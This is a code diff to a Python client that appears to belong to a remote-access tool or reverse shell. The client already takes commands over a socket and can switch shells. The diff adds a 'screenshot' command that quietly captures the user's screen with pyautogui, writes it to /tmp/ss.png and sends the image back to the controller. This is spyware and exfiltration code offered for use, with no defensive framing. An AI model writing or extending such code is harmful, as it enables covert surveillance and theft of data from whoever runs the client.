@@ -6,8 +6,34 @@ import subprocess
 import os
 import sys
 import argparse
+import time
+import base64
+import pyautogui
+
 
 BUFFER = 4096
+
+class ScreenshotHandler:
+    def __init__(self, sock):
+        self.sock = sock
+        data = self.take_screenshot()
+        self.send_screenshot(data)
+
+
+    def take_screenshot(self):
+        s = pyautogui.screenshot("/tmp/ss.png")
+        #data = base64.urlsafe_b64encode(s.tobytes())
+        filetosend = open("/tmp/ss.png", "rb")
+        data = filetosend.read()
+        return data
+
+    def send_screenshot(self, data) -> int:
+        try:
+            self.sock.sendall(data)
+            return 1
+        except:
+            return 0
+
 
 
 class Client:
@@ -76,6 +102,8 @@ class Client:
                     self.sock.sendall(b"Shell successfully changed to" + self.shell.encode())
                 else:
                     self.sock.sendall(self.args[1].encode() + b" Doesn't seem to be installed, Exiting.")
+            elif self.args[0] == "screenshot":
+                s = ScreenshotHandler(self.sock)
                 
 
             
